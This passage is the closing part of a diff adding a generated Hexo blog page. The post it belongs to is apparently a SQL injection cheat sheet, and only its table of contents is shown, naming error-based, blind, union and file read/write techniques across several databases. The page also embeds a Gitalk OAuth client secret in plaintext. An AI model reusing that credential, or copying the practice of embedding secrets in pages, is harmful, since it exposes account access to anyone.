+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;评论
+    </div>
+    
+        
+            
+
+    <div class="gitalk-comment-container">
+        <div id="gitalk-container"></div>
+        <link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+        <script  src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+        <script >
+          function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+              __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+              Gitalk && new Gitalk({
+                clientID: '17efb64209824b16935b',
+                clientSecret: '2ceab4677a6e6b5ebd72a6d3207a6611b13b7e95',
+                repo: 'hexo-blog-comments',
+                owner: 'seconme',
+                admin: 'seconme',
+                id: __gitalk__pathname,
+                proxy: '',
+                language: 'zh-CN'
+              }).render('gitalk-container');
+            } catch (e) {
+              window.Gitalk = null;
+            }
+          }
+
+          if ('false' === 'true') {
+            const loadGitalkTimeout = setTimeout(() => {
+              loadGitalk();
+              clearTimeout(loadGitalkTimeout);
+            }, 1000);
+          } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MySQL"><span class="nav-number">1.</span> <span class="nav-text">MySQL</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF"><span class="nav-number">1.1.</span> <span class="nav-text">数据库相关信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.</span> <span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#UPDATEXML"><span class="nav-number">1.2.1.</span> <span class="nav-text">UPDATEXML</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXTRACTVALUE"><span class="nav-number">1.2.2.</span> <span class="nav-text">EXTRACTVALUE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FLOOR-RAND-0-2"><span class="nav-number">1.2.3.</span> <span class="nav-text">FLOOR(RAND(0)*2)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Blind-%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.</span> <span class="nav-text">Blind 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#boolean-based"><span class="nav-number">1.3.1.</span> <span class="nav-text">boolean-based</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#time-based"><span class="nav-number">1.3.2.</span> <span class="nav-text">time-based</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Union-Injection"><span class="nav-number">1.4.</span> <span class="nav-text">Union Injection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5"><span class="nav-number">1.5.</span> <span class="nav-text">其他常用语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">1.6.</span> <span class="nav-text">读写文件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQLServer"><span class="nav-number">2.</span> <span class="nav-text">SQLServer</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PostgreSQL"><span class="nav-number">3.</span> <span class="nav-text">PostgreSQL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Oracle"><span class="nav-number">4.</span> <span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQLite3"><span class="nav-number">5.</span> <span class="nav-text">SQLite3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NoSQL"><span class="nav-number">6.</span> <span class="nav-text">NoSQL</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2023</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">seconme</a>
+            
+        </div>
+        
+            <script async 
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+            <div class="deploy-info info-item">
+                
+                    本站由 <span class="tooltip" data-content="GitHub Pages"><img src="/images/deploy-provider/github.png"></span> 提供部署服务
+                
+            </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+    <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts">
+    
+        <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+
+</body>
+</html>
